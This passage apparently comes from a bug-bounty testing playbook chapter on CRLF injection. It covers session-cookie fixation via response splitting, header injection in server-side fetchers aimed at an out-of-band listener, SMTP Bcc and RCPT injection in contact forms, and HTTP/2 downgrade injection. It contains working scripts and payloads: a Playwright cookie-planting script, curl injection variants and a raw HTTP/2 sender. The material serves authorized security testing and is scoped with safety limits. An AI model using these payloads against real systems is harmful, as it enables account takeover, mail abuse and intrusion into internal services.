  # 2. the planting link. Secure only on an https split: a plain-HTTP response cannot set it. A __Host- cookie takes
  #    no Domain and needs Secure and Path=/, so only the application's own host can plant it, over https
  DOM="%3B%20Domain=$PARENT"; SEC=''; case "$TPL" in https://*) SEC='%3B%20Secure';; esac
  case "$SC" in __Host-*) DOM='';; esac
  LINK="${TPL//@@/$L"Set-Cookie:%20$SC=$VE$DOM%3B%20Path=/%3B%20Max-Age=900$SEC"}"; echo "$LINK" > "$D/plant-link.txt"
  cat > "$D/fix.js" <<'JS'
  // usage: fix.js <plant link> <sign-in url> <cookie name> <evidence dir> <the HDR arguments>; B_USER and B_PASS from the environment
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [plant, login, name, dir, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    const jar = async t => fs.appendFileSync(`${dir}/victim-cookies.txt`, `${t}: ${JSON.stringify((await c.cookies()).filter(k => k.name === name))}\n`);
    await p.goto(plant).catch(() => {}); await p.waitForTimeout(1500); await jar('after the plant link');
    await p.goto(login);   // adapt the two selectors to the sign-in form; walk an SSO hand-off by hand in the same context
    await p.fill('input[type=email], input[name=email], input[name=username], input[name=login]', process.env.B_USER);
    await p.fill('input[type=password]', process.env.B_PASS); await p.keyboard.press('Enter');
    await p.waitForTimeout(5000); await jar('after B signed in'); await p.screenshot({ path: `${dir}/victim.png` }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fix.js" "$LINK" "$APP/login" "$SC" "$D" "${HDR[@]}"; cat "$D/victim-cookies.txt"
  # 3. the attacker's copy, which never signed in: whose account does it open? (the application's own profile call)
  curl -sS "${HDR[@]}" -b "$SC=$V" -o "$D/attacker-me.json" -w 'attacker with V: %{http_code}\n' "$APP/api/me"; head -c 300 "$D/attacker-me.json"
  ```
  An application that issues no identifier before sign-in may still adopt one it never issued: set
  `V=crl005$(openssl rand -hex 16)`, recompute `VE`, and repeat steps 2 and 3.
- **Proof:** `plant-link.txt` (the one link the victim opens), `victim-cookies.txt` showing `SC=V` stored after the
  link and still `V` after B signed in, and `attacker-me.json`: a client that only ever held `V` receiving account
  B's user id. Account B is ours. Where the cookie has no session effect, the proof is the stored cookie with its
  `Domain` and lifetime, which is Low.
- **Not a finding when:** the value after sign-in differs from `V`: the application rotates the session at sign-in
  and nothing was fixed (AUT-016 is negative here). The session cookie has the `__Host-` prefix and the split is on
  another host: only the application's own host can set it, over HTTPS and without `Domain`, and a `Domain=`
  cookie of that name is refused. The split is only on `http://`: current Chrome upgrades the link to `https://`
  before sending it, a plain-HTTP response cannot set a `Secure` cookie, and it cannot overwrite one the victim
  already holds (RFC 6265bis), so show the plant in the browser before claiming it. Two cookies with the session's
  name reach the application and it reads the real one: the browser sends the cookie with the longer `Path` first,
  so plant a longer one for the path the application reads it on. Planting many large cookies so that the site
  refuses every request is denial of service (`dos`), not this item.
- **Escalate:** AUT-016 for the rest of the fixation matrix (the 2FA step, the SSO callback, re-authentication).
  CSR-004 when a double-submit CSRF check compares a cookie with a form field: plant the cookie, then forge the
  request (#446271's summary plants a `csrf_id` cookie through a split). XSS-016 when a page writes a cookie value
  unencoded: the split is the delivery that makes it more than self-XSS.

### CRL-006 · A line break in a URL or header value that the server uses for its own outgoing request adds a header line or a second request that our listener receives

| | |
|---|---|
| **Severity** | None standalone (an extra line in a request to our own server is a primitive: park it); High to Critical when the added header or second request reaches the metadata service or an internal service (SSR-003, SSR-009) |
| **Requires** | url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | CRLF Injection · CWE-93 |
| **Prior art** | #590020, #1878489, #441090, #592864 |

- **Where:** every feature that makes the server request a URL we give, and every field it copies into that
  request: webhook URLs and custom webhook headers (name and value), "send test delivery" buttons, import by URL,
  link previews, avatar from URL, integrations with a base URL, a token or user name that ends up in a header,
  proxy and callback settings. The SSR chapter's inventory (`$E/evidence/$H/SSR-001/fetchers.md`) lists the
  fetchers when it exists.
- **Test:** the request line and headers of the outgoing request are written as lines, by an HTTP client library or
  by hand. Most current clients refuse a control character in the URL, but header values set through libcurl
  (PHP's curl extension) or a hand-built request often keep it, and older Python, Node and Ruby clients did not
  check (#590020 and #1878489 were paid as library bugs). Put the line break in each field in turn, as a
  percent-escape in URL fields and as a JSON escape in JSON bodies, and read the raw bytes our listener receives.
- **How:** run the listener on our OOB host (with interactsh instead, drop `:8006`, use a sub-domain label per
  variant, and read `interactsh-client -v`, which prints the raw request).
  ```bash
  D="$E/evidence/$H/CRL-006"; mkdir -p "$D"
  cat > "$D/rawlisten.py" <<'PY'
  # run on our OOB host: python3 rawlisten.py | tee crl006-listener.log   (prints every received byte, CR and LF visible)
  import socket
  s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("0.0.0.0", 8006)); s.listen(5)
  while True:
      c, a = s.accept(); c.settimeout(3); data = b""
      try:
          while len(data) < 65536:
              chunk = c.recv(4096)
              if not chunk:
                  break
              data += chunk
      except socket.timeout:
          pass
      print(a[0], repr(data[:4000]), flush=True)
      try:
          c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
      except OSError:      # the client already hung up
          pass
      c.close()
  PY
  F="$T/api/webhooks"       # the fetcher's request from the proxy history; this one is an example
  v(){ curl -sS "${HDR[@]}" $A -X POST "$F" -H 'Content-Type: application/json' -d "$2" -o "$D/$1.body" -w "$1 %{http_code}\n"; sleep 2; }
  v url-pct    "{\"url\":\"http://$OOB:8006/crl006a%0d%0aX-Crl006:%20probe\"}"
  v url-json   "{\"url\":\"http://$OOB:8006/crl006b\\r\\nX-Crl006: probe\"}"
  v url-query  "{\"url\":\"http://$OOB:8006/crl006c?x=1\\r\\nX-Crl006: probe\"}"
  v hdr-value  "{\"url\":\"http://$OOB:8006/crl006d\",\"headers\":{\"X-Test\":\"a\\r\\nX-Crl006: probe\"}}"
  v second-req "{\"url\":\"http://$OOB:8006/crl006e HTTP/1.1\\r\\nHost: $OOB\\r\\n\\r\\nGET /crl006f\"}"
  v control    "{\"url\":\"http://$OOB:8006/crl006g\",\"headers\":{\"X-Test\":\"a X-Crl006: probe\"}}"
  # trigger a delivery for each (the feature's "test" button or event), then read crl006-listener.log on the OOB host
  ```
  Use the feature's real field names and shape. Where it takes a URL in a query parameter instead of JSON, send the
  `%0d%0a` form there and the JSON form nowhere.
- **Proof:** the listener line for the variant with `\r\nX-Crl006: probe\r\n` inside the received headers (or two
  request lines in one connection for `second-req`), the request that configured it, and the control line in which
  the same text stayed inside one header. Save the listener log.
- **Not a finding when:** the line break arrives as `%0D%0A` in the request line (the client kept it encoded), or the
  feature refuses the value or fails and nothing arrives. The feature already lets users set any header they like:
  one more header through a line break adds nothing, unless the added line is one the feature forbids (`Host`,
  `Content-Length`, a second request) or lands in a request we could not otherwise shape. The destination is our own
  server and nothing else is reached: a header on a request to ourselves harms no one, so the result is parked until
  it is pointed inward.
- **Escalate:** SSR-003: the GCP and Azure metadata services need a request header (`Metadata-Flavor: Google`,
  `Metadata: true`) that a GET-only fetcher cannot send, and this line break adds it; prove with the
  service-account e-mail or the instance name and stop. AWS IMDSv2 needs a `PUT` for its token, which only a second
  request in the same connection could carry, and the fetcher reads only the first answer: describe it, do not
  chase it. SSR-009: internal text protocols on loopback (Redis, memcached) read each line as a command (#592864 is
  titled as writes to memcached through a share URL): prove reach with a read-only command and never write. API-008
  for values the back end puts into its own internal API calls, where the same line break changes a request we never
  see. #441090 is titled as CRLF and SSRF through `git://` reaching code execution: repository mirroring belongs to
  RCE-004.

### CRL-007 · A line break in a contact, invite or share form field adds a mail header or an SMTP recipient, and a copy of the organisation's mail reaches our second inbox

| | |
|---|---|
| **Severity** | Medium standalone when an added `Bcc:` or `RCPT TO:` delivers mail from the organisation's servers, with text we choose, to an address we choose; Low when only an added header shows in mail to ourselves; Critical with AUT-003 when the mail carries a password-reset link |
| **Requires** | email-out |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | CRLF Injection · CWE-93 |
| **Prior art** | #347439, #815085, #1509216, #901956 |

- **Where:** every form whose input ends up in a mail the application sends: contact and support forms (name,
  e-mail, subject), invitations (the invitee's address, our display name, the message), share by e-mail, referral
  invitations, newsletter sign-up, appointment and calendar invitations (#1509216 and #1516377 are titled as SMTP
  command injection through appointment e-mails and their iCalendar attachments), and stored fields that later
  appear in mail headers: the display
  name, the organisation name (#3913012), the e-mail address itself (#815085 is titled as an e-mail address field
  that accepted `%0d%0a`). A form with an anti-CSRF token needs the token copied from the form page; one with a
  CAPTCHA is submitted from the browser, one variant at a time.
- **Test:** the mail code writes `To`, `From`, `Reply-To` and `Subject` as lines, and a hand-written SMTP client
  writes `MAIL FROM:` and `RCPT TO:` the same way. A line break in a header field adds a header. Whether an added
  `Bcc:` is delivered depends on the sender: `sendmail -t` (PHP's `mail()`) and libraries that read the recipients
  from the headers deliver it; libraries that keep their own recipient list only show it in the raw source. A line
  break in an address that reaches `MAIL FROM:` adds an SMTP command. Use two inboxes of ours: `M1`, which the form
  normally writes to or which we enter as the sender, and `M2`, never entered anywhere on the target (a
  plus-address of our own mailbox is enough where the programme's alias rule allows it: `Delivered-To` shows which
  address received the copy). Each submission produces at most one extra mail, to `M2`. Never end the DATA section (a line holding only `.`) or start
  a second transaction.
- **How:** the field names come from the form's real request; put the line break in one field per request.
  ```bash
  D="$E/evidence/$H/CRL-007"; mkdir -p "$D"; : "${M1:?our inbox}" "${M2:?our second inbox, never entered on the target}"
  U="$T/contact"; MSG='security test crl007, please ignore'; S=()   # the form's action; S=($A) for invite and share forms
  f(){ n=$1; shift; curl -sS "${HDR[@]}" "${S[@]}" -o "$D/$n.body" -w "$n %{http_code}\n" -X POST "$U" "$@"; sleep 60; }
  f name-crlf    --data-urlencode "name=crl007"$'\r\n'"Bcc: $M2" --data-urlencode "email=$M1" --data-urlencode "message=$MSG"
  f name-lf      --data-urlencode "name=crl007"$'\n'"Bcc: $M2" --data-urlencode "email=$M1" --data-urlencode "message=$MSG"
  f subject-crlf --data-urlencode "subject=crl007"$'\r\n'"Bcc: $M2" --data-urlencode "email=$M1" --data-urlencode "message=$MSG"
  f email-crlf   --data-urlencode "email=$M1"$'\r\n'"Bcc: $M2" --data-urlencode "message=$MSG"
  f email-rcpt   --data-urlencode "email=$M1>"$'\r\n'"RCPT TO:<$M2" --data-urlencode "message=$MSG"
  f json-name    -H 'Content-Type: application/json' -d "{\"name\":\"crl007\\r\\nBcc: $M2\",\"email\":\"$M1\",\"message\":\"$MSG\"}"
  f hdr-only     --data-urlencode "name=crl007"$'\r\n'"X-Crl007: probe" --data-urlencode "email=$M1" --data-urlencode "message=$MSG"
  ```
  Save the raw source of everything that reaches `M1` and `M2` (the mail client's "show original") as
  `$D/<variant>.eml`, and read `X-Crl007`, `Received` and `DKIM-Signature` in it.
- **Proof:** the raw message at `M2`, an address no request named as a recipient, received from the organisation's
  mail servers (`Received` chain, `DKIM-Signature: d=` of the organisation's domain), next to the one request that
  produced it. For the header-only case, the raw source at `M1` with `X-Crl007: probe` as a header of its own. One
  copy is the whole proof: describe what an attacker could send, do not send it.
- **Not a finding when:** the value arrives in the body, or the Subject carries it as an encoded word
  (`=?UTF-8?Q?crl007=0D=0ABcc...?=`): the library encoded it. The added text starts with a space or tab in the raw
  source: a continuation of the previous header. Nothing reaches `M2` and the source at `M1` shows no added header:
  the line break was dropped. The form mails a copy to whatever address we type by design ("send me a copy"): mail
  to an address we choose is the feature, and only a recipient beyond it is the bug. HTML or links in the body of a
  contact-form mail are `content-spoofing` (#3802451 is rated medium and was not paid); missing SPF or DMARC records
  are `spf-dmarc`.
- **Escalate:** AUT-003: the same line break on the password-reset request, delivering a reset link for our own
  second account to an added address, is critical. RCE-003: a mail-server settings field (SMTP host, port, HELO
  name, sender) that takes a line break or a leading `-` reaches the mail transfer itself (#1200647 is titled as
  Grafana RCE through an SMTP server parameter). A stored display name or address with a line break puts the header
  into every mail sent to or about that account: report it once, with the list of mails it reaches.

### CRL-008 · An HTTP/2 front end writes a line break from a request header into the HTTP/1.1 request it sends upstream, and the back end acts on a header line the front end never saw

| | |
|---|---|
| **Severity** | Low standalone (a header the back end receives that no front-end rule saw); High to Critical with the SMG chapter when the same line break carries a framing header and smuggles a request |
| **Requires** | http2, reverse-proxy |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | CRLF Injection · CWE-93 |
| **Prior art** | #1391549, #1211724, #1575912 |

- **Where:** host names whose front end speaks HTTP/2 to the browser and HTTP/1.1 to the origin: CDNs, cloud load
  balancers, and nginx, HAProxy, Envoy or Apache `mod_proxy` in front of an application server (#1391549 is titled
  as request-line injection through HTTP/2 in Apache `mod_proxy`). Each host name can sit behind a different front
  end, so the item runs per host.
- **Test:** HTTP/2 carries a header as a name and a value with no line syntax, so a CR LF inside a value is just two
  bytes. RFC 9113 §8.2.1 requires the front end to treat such a request as malformed; one that does not, and writes
  the value into the HTTP/1.1 request, gives the back end an extra line. Use effects that change no framing: an
  injected `Range` makes a static file answer 206 with `Content-Range`, and a second `Host` line makes a conforming
  HTTP/1.1 back end answer 400. Try the value, the name, and `:path` (request-line injection). Never inject
  `Content-Length`, `Transfer-Encoding` or a second request here: that desynchronises a connection other users
  share, and belongs to the SMG chapter under its own rules.
- **How:** the script uses the Python `h2` package with its outbound checks switched off, so the bytes leave exactly
  as given.
  ```bash
  D="$E/evidence/$H/CRL-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  python3 -c 'import h2' 2>/dev/null || pip install --user h2
  cat > "$D/h2crlf.py" <<'PY'
  # h2crlf.py <host> <path> <header name> <header value> [-- the HDR arguments]; \r and \n in path, name and value are sent as CR and LF
  import socket, ssl, sys
  import h2.config, h2.connection, h2.events
  host, path, name, value = sys.argv[1:5]
  extra = sys.argv[6:] if len(sys.argv) > 5 and sys.argv[5] == "--" else []
  dec = lambda s: s.replace("\\r", "\r").replace("\\n", "\n")
  ua, more = "Mozilla/5.0", []
  for i in range(0, len(extra) - 1, 2):
      if extra[i] == "-A":
          ua = extra[i + 1]
      elif extra[i] == "-H":
          k, _, v = extra[i + 1].partition(":"); more.append((k.strip().lower(), v.strip()))
  hdrs = [(":method", "GET"), (":scheme", "https"), (":authority", host), (":path", dec(path)), ("user-agent", ua)] + more + [(dec(name), dec(value))]
  ctx = ssl.create_default_context(); ctx.set_alpn_protocols(["h2"])
  s = ctx.wrap_socket(socket.create_connection((host, 443), timeout=10), server_hostname=host)
  if s.selected_alpn_protocol() != "h2":
      sys.exit("no HTTP/2 on " + host)
  cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8", validate_outbound_headers=False,
                                  normalize_outbound_headers=False, validate_inbound_headers=False)
  c = h2.connection.H2Connection(config=cfg); c.initiate_connection()
  c.send_headers(c.get_next_available_stream_id(), hdrs, end_stream=True); s.sendall(c.data_to_send())
  body, done = b"", False
  while not done:
      data = s.recv(65535)
      if not data:
          break
      for ev in c.receive_data(data):
          if isinstance(ev, h2.events.ResponseReceived):
              print("\n".join(f"{k}: {v}" for k, v in ev.headers))
          elif isinstance(ev, h2.events.DataReceived):
              body += ev.data; c.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
          elif isinstance(ev, (h2.events.StreamEnded, h2.events.StreamReset, h2.events.ConnectionTerminated)):
              print("event:", type(ev).__name__, getattr(ev, "error_code", "")); done = True
      s.sendall(c.data_to_send())
  print("body:", len(body), repr(body[:120]))
  PY
  run(){ n=$1; shift; python3 "$D/h2crlf.py" "$H" "$@" -- "${HDR[@]}" > "$D/$n.txt" 2>&1
    printf '%-11s %s\n' "$n" "$(grep -aE '^(:status|content-range|server|event|body):' "$D/$n.txt" | tr '\n' ' ')"; sleep "$W"; }
  S=/robots.txt             # a static file the origin serves (a bundle or image from the crawl); a fresh query string per request keeps caches out
  run control    "$S?cb=$RANDOM" x-crl008 'a'
  run range      "$S?cb=$RANDOM" range 'bytes=0-4'                     # does this path honour Range at all?
  run value-crlf "$S?cb=$RANDOM" x-crl008 'a\r\nrange: bytes=0-4'      # Range exists only after the front end's rewrite
  run value-lf   "$S?cb=$RANDOM" x-crl008 'a\nrange: bytes=0-4'
  run value-host "$S?cb=$RANDOM" x-crl008 "a\\r\\nhost: $H"            # a second Host line: 400 from a conforming back end
  run name-crlf  "$S?cb=$RANDOM" 'x-crl008: a\r\nrange' 'bytes=0-4'
  run path-crlf  "$S?cb=$RANDOM HTTP/1.1\\r\\nrange: bytes=0-4\\r\\nx-crl008: a" x-crl008 'b'
  ```
- **Proof:** `value-crlf.txt` (or `value-lf`, `name-crlf`, `path-crlf`) with `:status: 206` and `content-range`, next
  to `control.txt` (200, full length) and `range.txt` (206: the path honours `Range` when the front end can see it),
  each run twice; or `value-host.txt` with the back end's 400 (its `server` header or error page) while the control
  is 200. Name the front end (`server`, `via`, CDN headers) and the back end.
- **Not a finding when:** the front end resets the stream (`event: StreamReset`, error code 1, PROTOCOL_ERROR) or
  answers 400 with its own error page: it validates, as RFC 9113 requires and most current front ends do. `range.txt`
  is a 200 too: the back end ignores `Range` on that path, so pick another static file or rely on the duplicate-Host
  test. The application server terminates HTTP/2 itself (no `via`, the same `server` on every error class): there is
  no downgrade, and a 400 is that server parsing its own input.
- **Escalate:** the SMG chapter: the same line break carrying `transfer-encoding: chunked` is HTTP/2 request
  smuggling (#1211724 is titled as request smuggling via HTTP/2; #1575912 as smuggling through newlines in a header
  value a CDN writes upstream); prove it on our own requests under that chapter's rules. The HHI chapter when an
  injected `Host` line reaches another virtual host behind the front end. The CCH chapter when a cacheable response
  changes with the injected line.

## Graveyard

- **The line break stayed encoded.** Scanner output (crlfuzz, CRLF templates) that flags `%0d%0a` echoed inside
  `Location` with no new header line. Sent without a manual proof it is `automated`; with one it is still not a
  split.
- **A split only through a request header.** `X-Forwarded-Host`, `X-Request-Id`, `Origin`, `User-Agent` or a cookie
  that the victim's browser cannot be made to send: self-only (#798686). The Host-header titles filed under this
  class (ten reports, one paid $100, #13286) are `host-header` without demonstrated impact and belong to the HHI
  chapter. A shared cache that stores the response makes it a CCH finding.
- **A split no current browser honours.** A bare CR, a folded line (CR LF followed by a space or tab), or a quirk of
  Internet Explorer (#197279's summary, #145392's title). Triagers reproduce in current Chrome and Firefox.
- **A split only on a plain-HTTP redirect.** Current Chrome upgrades `http://` navigations to `https://` before
  sending them, and HSTS preload removes the request entirely; without a browser demonstration it is closed as
  theoretical.
- **Cookie bombing.** Planting many large cookies so that every request to the site is refused is denial of service
  (`dos`); #583819 and #861521 are titled as cookie injection used that way. Do not run it.
- **Text in a split body without script.** Content spoofing (`content-spoofing`).
- **Log injection.** A line break in a value written to a log file forges a log line. Programmes close it as
  informative: nobody outside reads the log, and a forged line misleads only a person reading raw text. The class's
  log-injection titles (#963816, #1135875) are GitHub Security Lab CodeQL query submissions, not findings on a
  deployed target. A log viewer that renders entries as HTML is stored XSS in the staff interface (XSS chapter). No
  exclusion tag covers it.
- **Mail without an added recipient.** HTML or a link in the body of a contact-form mail (`content-spoofing`;
  #3802451 is rated medium and was not paid), "send me a copy" to an address we typed (the feature), missing SPF,
  DKIM or DMARC records (`spf-dmarc`).
- **Library and client bugs.** CRLF in urllib, undici, Netty and Apache httpd was paid upstream by the Internet Bug
  Bounty and GitHub Security Lab (six reports, $8,000 together); Shopify paid $800 for its own pitchfork server
  (#2279572). On a target these are the CVE chapter's, and `known-cve` inside the patch window. None of the 33 curl
  reports filed under the class was paid: they concern options the calling program sets.
- **Duplicates.** The path split on a programme's main host is in every scanner's template set; on a long-running
  programme expect `dup-risk`. New and secondary hosts (VPN portals, regional sites) are where the class still pays.

## Chains

- CRL-001, CRL-002, CRL-003 → CRL-004 (a body: script in the origin) and CRL-005 (a cookie: the session).
- CRL-004 → XSS-018: the account action that makes it High; on a sibling sub-domain the same script writes
  parent-domain cookies (XSS-016, CSR-011).
- CRL-005 → AUT-016 (fixation across sign-in, 2FA and SSO), CSR-004 (a planted double-submit cookie), XSS-016 (a
  cookie the page writes unencoded, now deliverable).
- RDR-001 and RDR-002 → CRL-002: the redirect inventory, and the allow-list bypasses that bring our value to
  `Location`.
- CRL-001 to CRL-003 → CCH items: a cacheable split serves our header or body to every visitor, which also makes a
  request-header-only split reportable.
- CRL-006 → SSR-003 (the metadata header a GET-only fetcher lacks), SSR-009 (text protocols on loopback), API-008
  (internal API calls), RCE-004 (repository mirroring, #441090).
- CRL-007 → AUT-003 (a reset link delivered to an added address), RCE-003 (mail-server settings and mail transfer
  options, #1200647).
- CRL-008 → SMG items (a framing header through the same line break), HHI items (a `Host` line to another virtual
  host).

## Sources

- `kb/reports/crlf.md` and `kb/reports/all/crlf.md`: the disclosed reports this chapter is built from;
  `kb/reports/smuggling.md` for CRL-008.
- HexBrain: `get_testing_playbook {"topic":"CRLF Injection"}`, `find_bypasses {"protection":"crlf filter"}`, `find_payloads {"topic":"CRLF Injection"}`.
- PortSwigger Web Security Academy: HTTP response header injection, HTTP/2 request smuggling via CRLF injection;
  James Kettle, "HTTP/2: The Sequel is Always Worse" (2021).
- OWASP WSTG-INPV-15 (HTTP Splitting and Smuggling) and WSTG-INPV-10 (IMAP and SMTP Injection); PayloadsAllTheThings,
  CRLF Injection; Gixy, the nginx configuration analyser, `http_splitting` check.
- RFC 9112 §2.2 (line terminators, bare CR), §3.2 (exactly one Host), §5.2 (obsolete line folding); RFC 9113 §8.2.1
  (field validity); RFC 6265 §5.4 (cookie order) and RFC 6265bis (cookie prefixes, secure cookies and insecure
  origins); RFC 5321 and RFC 5322 (SMTP commands, mail headers); the Fetch Standard, "extract a MIME type".
